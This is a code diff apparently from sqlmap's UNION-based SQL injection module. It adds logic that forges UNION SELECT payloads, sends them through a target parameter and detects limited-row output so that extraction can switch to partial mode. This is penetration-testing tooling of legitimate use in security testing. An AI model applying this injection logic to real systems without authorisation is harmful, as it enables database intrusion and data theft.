@@ -28,6 +28,7 @@ from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.dicts import FROM_DUMMY_TABLE
 from lib.core.enums import PAYLOAD
+from lib.core.settings import LIMITED_ROWS_TEST_NUMBER
 from lib.core.settings import UNION_MIN_RESPONSE_CHARS
 from lib.core.settings import UNION_STDEV_COEFF
 from lib.core.settings import MIN_RATIO
@@ -205,6 +206,22 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
 
                 if not all(_ in content for _ in (phrase, phrase2)):
                     vector = (position, count, comment, prefix, suffix, kb.uChar, PAYLOAD.WHERE.NEGATIVE, kb.unionDuplicates)
+                elif not kb.unionDuplicates:
+                    fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())
+
+                    # Check for limited row output
+                    query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
+                    payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
+
+                    # Perform the request
+                    page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
+                    content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
+                        removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
+                        payload, True) or "")
+                    if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
+                        warnMsg = "output with limited number of rows detected. Switching to partial mode"
+                        logger.warn(warnMsg)
+                        vector = (position, count, comment, prefix, suffix, kb.uChar, PAYLOAD.WHERE.NEGATIVE, kb.unionDuplicates)
 
             unionErrorCase = kb.errorIsNone and wasLastRequestDBMSError()
 
